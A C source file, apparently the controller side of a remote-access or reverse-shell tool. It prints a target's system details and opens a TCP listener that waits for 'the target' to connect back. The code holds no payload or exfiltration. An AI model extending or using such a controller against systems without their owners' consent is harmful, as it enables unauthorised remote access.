#include"fonction.h"

void SysInfo(const char *hostname, const char *username, const char *osVersion, const char *kernel, const char *arch) {
    printf("Computer     : %s\n", hostname);
    printf("User         : %s\n", username);
    printf("OS           : %s\n", osVersion);
    printf("Kernel       : %s\n", kernel);
    printf("Architecture : %s\n", arch);

}

SocketType Listen(const unsigned int portTarget) {
    struct sockaddr_in sin;
    SocketType sock, new_sock;
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    sin.sin_addr.s_addr = INADDR_ANY;
    sin.sin_port = htons(portTarget);
    sin.sin_family = AF_INET;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (bind(sock, (struct sockaddr *) &sin, sizeof sin) < 0) {
        printf(RED "[!] Erreur lors de la liaison." RESET);
        CloseSocket(sock);
        exit(1);
    }

    printf("[*] En attente la connexion de la cible...\n");
    if (listen(sock, 1) < 0) {
        printf(RED "[!] Erreur lors de l'écoute." RESET);
        CloseSocket(sock);
        exit(1);
    }

#ifdef _WIN32
    size_t addrlen = sizeof sin;
    if ((new_sock = accept(sock, (struct sockaddr *) &sin, (int *) &addrlen)) < 0) {
        printf(RED "[!] Erreur lors de l'acceptation." RESET);
        closesocket(sock);
        exit(1);
    }
#elif defined(__unix__)
    socklen_t addrlen = sizeof(sin);
    if ((new_sock = accept(sock, (struct sockaddr *) &sin, &addrlen)) < 0) {
        printf(RED "[!] Erreur lors de l'acceptation." RESET);
        close(sock);
        exit(1);
    }
#endif
    printf(GREEN "[+] Connexion établie avec la cible au port %d\n" RESET, portTarget);
    return new_sock;
}

void CloseConnect() {
#ifdef _WIN32
    WSACleanup();
#endif
}
